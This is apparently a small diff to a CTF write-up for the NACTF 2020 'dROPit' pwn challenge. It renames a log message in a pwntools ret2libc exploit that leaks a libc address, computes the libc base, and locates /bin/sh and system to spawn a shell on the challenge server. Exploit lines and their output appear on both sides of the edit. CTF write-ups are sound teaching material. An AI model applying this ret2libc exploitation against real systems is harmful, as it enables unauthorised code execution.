@@ -277,7 +277,7 @@ burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$
 libc = ELF("./libc6_2.32-0ubuntu2_amd64.so")
 
 libc.address = leak - libc.sym["puts"]
-info("libc_base_addr: %s" % hex(libc.address))
+info("libc base address: %s" % hex(libc.address))
 
 BINSH = next(libc.search("/bin/sh"))
 SYSTEM = libc.sym["system"]
@@ -320,7 +320,7 @@ burgos1337@LAPTOP-4VD7KB18:/mnt/c/Users/Lenovo/Desktop/NACTF 2020/dROPit$ python
 [*] main: 0x401146
 [+] Opening connection to challenges.ctfd.io on port 30261: Done
 [*] leaked libc address: 0x7f630d713d90
-[*] libc_base_addr: 0x7f630d693000
+[*] libc base address: 0x7f630d693000
 [*] bin/sh: 0x7f630d84141f
 [*] system: 0x7f630d6e33c0
 [*] ret gadget: 0x40101a
